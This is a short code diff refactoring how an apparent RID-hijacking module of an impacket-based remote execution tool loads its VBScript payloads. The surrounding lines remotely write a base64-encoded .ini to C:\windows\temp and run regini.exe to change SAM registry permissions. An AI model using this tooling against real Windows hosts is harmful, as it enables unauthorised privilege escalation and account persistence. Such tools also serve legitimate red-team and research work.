@@ -7,10 +7,10 @@ import time
 import os
 import logging
 
+from lib.helpers import get_vbs
 from lib.methods.executeVBS import executeVBS_Toolkit
 from lib.modules.exec_command import EXEC_COMMAND
 from impacket.dcerpc.v5.dtypes import NULL
-from lib.helpers import get_vbs_path
 
 
 class RID_Hijack_Toolkit():
@@ -83,9 +83,7 @@ class RID_Hijack_Toolkit():
 
             ini_FileName = f"windows-object-{uuid.uuid4()!s}.ini"
 
-            with open(get_vbs_path("Exec-Command-Silent-UnderNT6-II.vbs")) as f:
-                vbs = f.read()
-
+            vbs = get_vbs("Exec-Command-Silent-UnderNT6-II.vbs")
             vbs = vbs.replace("REPLACE_WITH_DEST", f"C:\\windows\\temp\\{ini_FileName}").replace("REPLACE_WITH_DATA", base64.b64encode(ini_Content.encode("utf-8")).decode("utf-8")).replace("REPLACE_WITH_COMMAND", f"regini.exe C:\\windows\\temp\\{ini_FileName}")
 
             tag = executer_vbs.ExecuteVBS(vbs_content=vbs, returnTag=True)
@@ -94,8 +92,8 @@ class RID_Hijack_Toolkit():
             self.logger.log(100, "Granted / Restricted user permissions to registry key via regini.exe")
         else:
             self.logger.info("Granting / Restricting user permissions to registry key via regini.exe")
-            with open(get_vbs_path("GrantSamAccessPermission.vbs")) as f:
-                vbs = f.read()
+
+            vbs = get_vbs("GrantSamAccessPermission.vbs")
             vbs = vbs.replace("REPLACE_WITH_USER", currentUsers)
             tag = executer_vbs.ExecuteVBS(vbs_content=vbs, returnTag=True)
 
